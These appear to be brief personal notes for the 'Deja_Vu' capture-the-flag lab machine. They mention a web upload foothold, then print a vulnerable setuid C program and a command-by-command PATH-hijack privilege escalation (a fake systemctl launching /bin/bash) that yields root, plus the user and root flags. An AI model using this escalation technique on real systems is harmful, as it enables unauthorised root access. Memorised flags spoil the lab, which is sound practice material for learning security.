# Deja_Vu 

> VOiD | Thursday 18 November 2021 01:23:19 PM IST

My IP : 10.8.253.221
Target IP : 10.10.9.30



## PORT 80 [http]


```
   <!--
        What should happen when we click on a picture of a dog? 
        How do we style it to make it show that it's clickable?
    -->
```

http://10.10.9.30/dogpic/?id=1

/upload 

use msfconsole to create payload

```bash
/usr/bin/script -qc /bin/bash /dev/null
export TERM=xterm
cat user.txt
dejavu{735c0553063625f41879e57d5b4f3352}
```


```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{   
    setuid(0);
    setgid(0);
    printf(
        "Welcome to the DogPics server manager Version 1.0\n"
        "Please enter a choice:\n");
    int operation = 0;
    printf(
        "0 -\tGet server status\n"
        "1 -\tRestart server\n");
    while (operation < 48 || operation > 49) {
        operation = getchar();
        getchar();
        if (operation < 48 || operation > 49) {
            printf("Invalid choice.\n");
        }
    }
    operation = operation - 48;
    //printf("Choice was:\t%d\n",operation);
    switch (operation)
    {
    case 0:
        //printf("0\n");
        system("systemctl status --no-pager dogpics");
        break;
    case 1:
        system("systemctl restart dogpics");
        break;
    default:
        break;
    }
}
```

```bash
[dogpics@dejavu ~]$ which systemctl
/usr/bin/systemctl
[dogpics@dejavu ~]$ echo '/bin/bash' > systemctl
[dogpics@dejavu ~]$ chmod +x systemctl
[dogpics@dejavu ~]$ export PATH=.:$PATH
[dogpics@dejavu ~]$ which systemctl
./systemctl
[dogpics@dejavu ~]$ ./serverManager 
Welcome to the DogPics server manager Version 1.0
Please enter a choice:
0 -   Get server status
1 -   Restart server
0
[root@dejavu ~]# whoami
root
[root@dejavu root]# cat root.txt 
dejavu{5ad931368bdc46f856febe4834ace627}

```